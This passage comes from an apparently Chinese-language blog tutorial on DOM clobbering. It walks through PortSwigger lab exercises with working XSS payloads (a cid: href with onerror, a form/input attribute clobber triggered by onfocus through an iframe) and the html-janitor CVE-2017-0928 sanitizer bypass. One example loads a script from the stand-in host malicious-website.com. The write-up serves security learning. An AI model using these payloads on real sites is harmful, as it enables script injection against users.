+</span></span><span class=line><span class=cl>       <span class=nx>props</span><span class=p>.</span><span class=nx>push</span><span class=p>(</span><span class=nx>html</span><span class=p>[</span><span class=nx>i</span><span class=p>]</span><span class=o>+</span><span class=s1>&#39;:&#39;</span><span class=o>+</span><span class=nx>prop</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span><span class=k>catch</span><span class=p>(</span><span class=nx>e</span><span class=p>){}</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl> <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>([...</span><span class=k>new</span> <span class=nx>Set</span><span class=p>(</span><span class=nx>props</span><span class=p>)].</span><span class=nx>join</span><span class=p>(</span><span class=s1>&#39;\n&#39;</span><span class=p>));</span>
+</span></span></code></pre></td></tr></table></div></div><p>我们可以得到一系列的标签以及其属性名称，例如我们可以利用其中的<code>a:title</code>来进行组合</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>a</span> <span class=na>id</span><span class=o>=</span><span class=s>x</span> <span class=na>title</span><span class=o>=</span><span class=s>&#39;hasaki&#39;</span><span class=p>&gt;&lt;/</span><span class=nt>a</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>  <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>x</span><span class=p>.</span><span class=nx>title</span><span class=p>);</span><span class=c1>//hasaki
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><p>其中在我们第一步得到的属性中比较有意思的是 a 标签的<code>username</code>跟<code>password</code>属性，虽然我们不能直接通过<code>title</code>这种形式利用，但是我们可以通过<code>href</code>的形式来进行利用：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>a</span> <span class=na>id</span><span class=o>=</span><span class=s>x</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;ftp:Clobbered-username:Clobbered-Password@a&#34;</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=nx>alert</span><span class=p>(</span><span class=nx>x</span><span class=p>.</span><span class=nx>username</span><span class=p>)</span><span class=c1>//Clobbered-username
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>alert</span><span class=p>(</span><span class=nx>x</span><span class=p>.</span><span class=nx>password</span><span class=p>)</span><span class=c1>//Clobbered-password
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=bp靶场练习>bp靶场练习</h2><p>bp官方说这个漏洞的利用点在于</p><p>如果有全局变量定义为</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kd>var</span> <span class=nx>someObject</span> <span class=o>=</span> <span class=nb>window</span><span class=p>.</span><span class=nx>someObject</span> <span class=o>||</span> <span class=p>{};</span>
+</span></span></code></pre></td></tr></table></div></div><p>我们可以尝试以下代码覆盖</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=nb>window</span><span class=p>.</span><span class=nx>onload</span> <span class=o>=</span> <span class=kd>function</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=kd>let</span> <span class=nx>someObject</span> <span class=o>=</span> <span class=nb>window</span><span class=p>.</span><span class=nx>someObject</span> <span class=o>||</span> <span class=p>{};</span>
+</span></span><span class=line><span class=cl>        <span class=kd>let</span> <span class=nx>script</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s1>&#39;script&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nx>script</span><span class=p>.</span><span class=nx>src</span> <span class=o>=</span> <span class=nx>someObject</span><span class=p>.</span><span class=nx>url</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=nb>document</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>script</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>};</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><p>甚至注入外部js脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>a</span> <span class=na>id</span><span class=o>=</span><span class=s>someObject</span><span class=p>&gt;&lt;</span><span class=nt>a</span> <span class=na>id</span><span class=o>=</span><span class=s>someObject</span> <span class=na>name</span><span class=o>=</span><span class=s>url</span> <span class=na>href</span><span class=o>=</span><span class=s>//malicious-website.com/evil.js</span><span class=p>&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=exploiting-dom-clobbering-to-enable-xss>Exploiting DOM clobbering to enable XSS</h3><p>上来是一个博客界面，随便点一个进去可以看到评论界面,查看源码看到两个js</p><p><img src=/p/dom-clobbering/image-20250809155319123_hu_c3ec52768aabefb7.webp width=1024 height=324 srcset="/p/dom-clobbering/image-20250809155319123_hu_51eaa911d88b091e.webp 480w, /p/dom-clobbering/image-20250809155319123_hu_c3ec52768aabefb7.webp 1024w" sizes="(min-width: 1280px) 800px, (min-width: 768px) 65vw, calc(100vw - 30px)" data-full-src=/p/dom-clobbering/image-20250809155319123_hu_e5c987bdb5402320.webp data-full-width=1149 data-full-height=363 loading=lazy decoding=async alt=image-20250809155319123 class=gallery-image data-flex-grow=316 data-flex-basis=759px></p><p>第一个domPurify-2.0.15.js是用来防御xss的，而第二个js可能就是我们利用漏洞的地方了</p><p>在它的displayComments函数我们看到了熟悉的全局变量</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kd>let</span> <span class=nx>defaultAvatar</span> <span class=o>=</span> <span class=nb>window</span><span class=p>.</span><span class=nx>defaultAvatar</span> <span class=o>||</span> <span class=p>{</span><span class=nx>avatar</span><span class=o>:</span> <span class=s1>&#39;/resources/images/avatarDefault.svg&#39;</span><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=kd>let</span> <span class=nx>avatarImgHTML</span> <span class=o>=</span> <span class=s1>&#39;&lt;img class=&#34;avatar&#34; src=&#34;&#39;</span> <span class=o>+</span> <span class=p>(</span><span class=nx>comment</span><span class=p>.</span><span class=nx>avatar</span> <span class=o>?</span> <span class=nx>escapeHTML</span><span class=p>(</span><span class=nx>comment</span><span class=p>.</span><span class=nx>avatar</span><span class=p>)</span> <span class=o>:</span> <span class=nx>defaultAvatar</span><span class=p>.</span><span class=nx>avatar</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;&#34;&gt;&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kd>let</span> <span class=nx>divImgContainer</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s2>&#34;div&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>divImgContainer</span><span class=p>.</span><span class=nx>innerHTML</span> <span class=o>=</span> <span class=nx>avatarImgHTML</span>
+</span></span></code></pre></td></tr></table></div></div><p>我们可以用 Dom Clobbering 来控制 <code>window.defaultAvatar</code>.只要我们原来没有头像就可以用一个构造一个<code>defaultAvatar.avatar</code>进行 XSS 了。</p><p>根据前面我们学的，这是一个二级关系，我们可以用htmlcollection</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>a</span> <span class=na>id</span><span class=o>=</span><span class=s>defaultAvatar</span><span class=p>&gt;&lt;</span><span class=nt>a</span> <span class=na>id</span><span class=o>=</span><span class=s>defaultAvatar</span> <span class=na>name</span><span class=o>=</span><span class=s>avatar</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;cid:&amp;quot;onerror=alert(1)//&#34;</span><span class=p>&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><p>这里的<code>"</code>要转成html实体编码</p><p>改变完defaultAvatar的值之后，只要随便评论就能触发恶意代码导致xss</p><p><img src=/p/dom-clobbering/image-20250809161447107_hu_3127ed14cfbfa2e1.webp width=741 height=134 srcset="/p/dom-clobbering/image-20250809161447107_hu_a3129971ab2efb67.webp 480w, /p/dom-clobbering/image-20250809161447107_hu_3127ed14cfbfa2e1.webp 741w" sizes="(min-width: 1280px) 800px, (min-width: 768px) 65vw, calc(100vw - 30px)" data-full-src=/p/dom-clobbering/image-20250809161447107_hu_3127ed14cfbfa2e1.webp data-full-width=741 data-full-height=134 loading=lazy decoding=async alt=image-20250809161447107 class=gallery-image data-flex-grow=552 data-flex-basis=1327px></p><p>可以看到我们已经插入了恶意代码，然后我们随意评论aaa，返回的时候直接触发了</p><p><img src=/p/dom-clobbering/image-20250809163114220_hu_3626042bec61408a.webp width=552 height=177 srcset="/p/dom-clobbering/image-20250809163114220_hu_1084d2313eadea21.webp 480w, /p/dom-clobbering/image-20250809163114220_hu_3626042bec61408a.webp 552w" sizes="(min-width: 1280px) 800px, (min-width: 768px) 65vw, calc(100vw - 30px)" data-full-src=/p/dom-clobbering/image-20250809163114220_hu_3626042bec61408a.webp data-full-width=552 data-full-height=177 loading=lazy decoding=async alt=image-20250809163114220 class=gallery-image data-flex-grow=311 data-flex-basis=748px></p><p>这里我很奇怪为什么这个href只能是cid开头，而别的不行，然后看了官方题解说是cid协议，它不使用url编码双引号，就能用html实体编码来注入，使得下一次的全局变量avatar为恶意代码</p><h3 id=clobbering-dom-attributes-to-bypass-html-filters>Clobbering DOM attributes to bypass HTML filters</h3><p>这里就要用到上面二级关系的第二种办法，form标签与其他标签的层级关系</p><p>例如</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>form</span> <span class=na>onclick</span><span class=o>=</span><span class=s>alert(1)</span><span class=p>&gt;&lt;</span><span class=nt>input</span> <span class=na>id</span><span class=o>=</span><span class=s>attributes</span><span class=p>&gt;</span>Click me
+</span></span></code></pre></td></tr></table></div></div><p>这里点进去依旧看源码</p><p>这题比上题安全多了，没有直接用windows这种来调用全局变量</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=k>for</span> <span class=p>(</span><span class=kd>var</span> <span class=nx>a</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>a</span> <span class=o>&lt;</span> <span class=nx>node</span><span class=p>.</span><span class=nx>attributes</span><span class=p>.</span><span class=nx>length</span><span class=p>;</span> <span class=nx>a</span> <span class=o>+=</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>attr</span> <span class=o>=</span> <span class=nx>node</span><span class=p>.</span><span class=nx>attributes</span><span class=p>[</span><span class=nx>a</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>shouldRejectAttr</span><span class=p>(</span><span class=nx>attr</span><span class=p>,</span> <span class=nx>allowedAttrs</span><span class=p>,</span> <span class=nx>node</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>          <span class=nx>node</span><span class=p>.</span><span class=nx>removeAttribute</span><span class=p>(</span><span class=nx>attr</span><span class=p>.</span><span class=nx>name</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>          <span class=c1>// Shift the array to continue looping.
+</span></span></span><span class=line><span class=cl><span class=c1></span>          <span class=nx>a</span> <span class=o>=</span> <span class=nx>a</span> <span class=o>-</span> <span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>      <span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>我们可以构造一个包含有<code>name=attributes</code>的子节点的 payload 绕过属性的 check ，这里给定的白名单标签也比较明显，我们可以通过 HTML Relationships 来构造我们的 payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>form</span> <span class=na>id</span><span class=o>=</span><span class=s>x</span> <span class=p>&gt;&lt;</span><span class=nt>input</span> <span class=na>id</span><span class=o>=</span><span class=s>attributes</span><span class=p>&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><p>接着就是构造 XSS 了，根据题目要求，需要用户访问触发，所以我们可以利用<code>tabindex</code>属性，配合<code>form</code>的<code>onfocus</code>时间来 XSS 。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>form</span> <span class=na>id</span><span class=o>=</span><span class=s>x</span> <span class=na>tabindex</span><span class=o>=</span><span class=s>0</span> <span class=na>onfocus</span><span class=o>=</span><span class=s>alert(123)</span><span class=p>&gt;&lt;</span><span class=nt>input</span> <span class=na>id</span><span class=o>=</span><span class=s>attributes</span><span class=p>&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/dom-clobbering/image-20250809170141987_hu_98ccbf1659a005e8.webp width=1024 height=367 srcset="/p/dom-clobbering/image-20250809170141987_hu_9e5f135154235f49.webp 480w, /p/dom-clobbering/image-20250809170141987_hu_98ccbf1659a005e8.webp 1024w" sizes="(min-width: 1280px) 800px, (min-width: 768px) 65vw, calc(100vw - 30px)" data-full-src=/p/dom-clobbering/image-20250809170141987_hu_9acce1682bdc0a6c.webp data-full-width=1213 data-full-height=435 loading=lazy decoding=async alt=image-20250809170141987 class=gallery-image data-flex-grow=278 data-flex-basis=669px></p><p>但是如果直接交给用户点击的话是不会触发的，因为评论是由 aJax 请求拿到的，直接访问的话，Dom 树是还没有评论的，得需要等待 JS 执行完成才会有评论，所以这里我们需要一个延时或者阻塞的操作。比较简单的是利用<code>iframe</code>进行<code>setTimeout</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>iframe</span> <span class=na>src</span><span class=o>=</span><span class=s>https://your-lab-id.web-security-academy.net/post?postId=3</span> <span class=na>onload</span><span class=o>=</span><span class=s>&#34;setTimeout(a=&gt;this.src=this.src+&#39;#x&#39;,500)&#34;</span><span class=p>&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><p>这里要注意一定要得等评论加载完毕再用<code>#x</code>选择<code>form</code>，所以这里的 500ms 需要根据自己的网络情况适当调整。</p><h2 id=一些著名的利用漏洞>一些著名的利用漏洞</h2><h3 id=cve-2017-0928-bypassing-sanitization-using-dom-clobbering>CVE-2017-0928 Bypassing sanitization using DOM clobbering</h3><p><a class=link href=https://github.com/guardian/html-janitor/ target=_blank rel=noopener>html-janitor</a> 也就是我们上文用到的 HTML filters，在 v2.0.2 当中，janitor 在循环中有这么几行代码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>do {
+</span></span><span class=line><span class=cl>  // Ignore nodes that have already been sanitized
+</span></span><span class=line><span class=cl>  if (node._sanitized) {
+</span></span><span class=line><span class=cl>    continue;
+</span></span><span class=line><span class=cl>  }
+</span></span><span class=line><span class=cl>  //...
+</span></span><span class=line><span class=cl>  // Sanitize children
+</span></span><span class=line><span class=cl>  this._sanitize(node);
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  // Mark node as sanitized so it&#39;s ignored in future runs
+</span></span><span class=line><span class=cl>  node._sanitized = true;
+</span></span><span class=line><span class=cl>} while ((node = treeWalker.nextSibling()));
+</span></span></code></pre></td></tr></table></div></div><p>用<code>_sanitized</code>作为标志位来标志是否已经进行标准化，但是这里，由我们上个例子可以得出，我们可以利用与上个例子类似的 payload 绕过第一个 if 就可以绕过标准化过滤了。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;form&gt;&lt;object onmouseover=alert(document.domain) name=_sanitized&gt;&lt;/object&gt;&lt;/form&gt;
+</span></span></code></pre></td></tr></table></div></div><p>修复方案是删除了这些判断，对子树利用递归形式进行标准化过滤。</p><h3 id=xss-in-gmails-amp4email-via-dom-clobbering>XSS in GMail’s AMP4Email via DOM Clobbering</h3><p>这个就不细说了，感兴趣师傅可以去搜搜</p></section><footer class=article-footer><section class=article-tags><a href=/tags/xss-trick/>XSS Trick</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under 9u_l3</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>相关文章</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/p/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92/><div class=article-image><img src=/p/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92/1_hu_85e3fc5d850097b4.a25d32c09d58a996f22dac50265fdd42.webp width=250 height=150 loading=lazy decoding=async alt=文章封面：Web缓存投毒 data-hash="md5-ol0ywJ1YqZbyLaxQJl/dQg=="></div><div class=article-details><h2 class=article-title>Web缓存投毒</h2></div></a></article><article class=has-image><a href=/p/client-side-desync-attackscve-2022-29361/><div class=article-image><img src=/p/client-side-desync-attackscve-2022-29361/1_hu_fb15e3286fa9961f.72c47e94a38c255d20474c42840d4ec1.webp width=250 height=150 loading=lazy decoding=async alt="文章封面：Client-side desync attacks（CVE-2022-29361）" data-hash="md5-csR+lKOMJV0gR0xChA1OwQ=="></div><div class=article-details><h2 class=article-title>Client-side desync attacks（CVE-2022-29361）</h2></div></a></article><article class=has-image><a href=/p/%E6%82%AC%E7%A9%BA%E6%A0%87%E8%AE%B0%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BBdangling-markup%E7%BB%95csp/><div class=article-image><img src=/p/%E6%82%AC%E7%A9%BA%E6%A0%87%E8%AE%B0%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BBdangling-markup%E7%BB%95csp/1_hu_69e80831d4c0411e.c086a0335e9b684b9b4e5cf6001b6631.webp width=250 height=150 loading=lazy decoding=async alt="文章封面：悬空标记注入攻击（Dangling markup）绕CSP" data-hash="md5-wIagM16baEubTlz2ABtmMQ=="></div><div class=article-details><h2 class=article-title>悬空标记注入攻击（Dangling markup）绕CSP</h2></div></a></article><article class=has-image><a href=/p/graphql%E6%B8%97%E9%80%8F/><div class=article-image><img src=/p/graphql%E6%B8%97%E9%80%8F/1_hu_48a0de4191e6af44.f556a1055e61baed200e43805e530aa7.webp width=250 height=150 loading=lazy decoding=async alt=文章封面：GraphQL渗透 data-hash="md5-9VahBV5huu0gDkOAXlMKpw=="></div><div class=article-details><h2 class=article-title>GraphQL渗透</h2></div></a></article><article class=has-image><a href=/p/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/><div class=article-image><img src=/p/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/1_hu_af0d5ddfde49d4ea.a31eb009b4f150300a9571daa2af9189.webp width=250 height=150 loading=lazy decoding=async alt=文章封面：反弹shell学习 data-hash="md5-ox6wCbTxUDAKlXHaoq+RiQ=="></div><div class=article-details><h2 class=article-title>反弹shell学习</h2></div></a></article></div></div></aside><script src=//unpkg.com/@waline/client@v2/dist/waline.js></script><link href=//unpkg.com/@waline/client@v2/dist/waline.css rel=stylesheet><div id=waline class=waline-container></div><style>.waline-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding);--waline-font-size:var(--article-font-size)}.waline-container .wl-count{color:var(--card-text-color-main)}</style><script>Waline.init({dark:'html[data-scheme="dark"]',el:"#waline",emoji:["https://unpkg.com/@waline/emojis@1.0.1/weibo"],locale:{admin:"Admin",placeholder:null},requiredMeta:["name","email","url"],serverURL:"https://waline-test-one-smoky.vercel.app"})</script><footer class=site-footer><section class=copyright>&copy;
+2025 -
+2026 无敌可爱美咕噜</section><section class=powerby>使用 <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> 构建<br>主题 <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.30.0>Stack</a></b> 由 <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> 设计</section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.c1359695076787b3e6c2c57e9020904701cc696d5767c0ab1e455ca7031aae69.js defer></script><script type=text/javascript src=/ts/custom.21fb9193a315382e5c9cc70d4be76a78390116b15319b875de205795ecf99ac9.js defer></script><script>const cdnPath="https://cdn.jsdelivr.net/gh/0d000721999/live2d-test@f09405fd",cssPath="https://0d000721999.github.io/waifu/waifu.css",config={path:{homePath:"/",modelPath:cdnPath+"/Resources/",cssPath,tipsJsonPath:cdnPath+"/waifu-tips.json",tipsJsPath:cdnPath+"/waifu-tips.js",live2dCorePath:cdnPath+"/Core/live2dcubismcore.js",live2dSdkPath:cdnPath+"/live2d-sdk.js"},tools:["hitokoto","asteroids","express","photo","quit"],drag:{enable:!0,direction:["x","y"]},switchType:"order"};screen.width>=768&&Promise.all([loadExternalResource(config.path.cssPath,"css"),loadExternalResource(config.path.live2dCorePath,"js"),loadExternalResource(config.path.live2dSdkPath,"js"),loadExternalResource(config.path.tipsJsPath,"js")]).then(()=>{initWidget({waifuPath:config.path.tipsJsonPath,cdnPath:config.path.modelPath,tools:config.tools,dragEnable:config.drag.enable,dragDirection:config.drag.direction,switchType:config.switchType})});function loadExternalResource(e,t){return new Promise((n,s)=>{let o;t==="css"?(o=document.createElement("link"),o.rel="stylesheet",o.href=e):t==="js"&&(o=document.createElement("script"),o.src=e),o&&(o.onload=()=>n(e),o.onerror=()=>s(e),document.head.appendChild(o))})}</script></body></html>
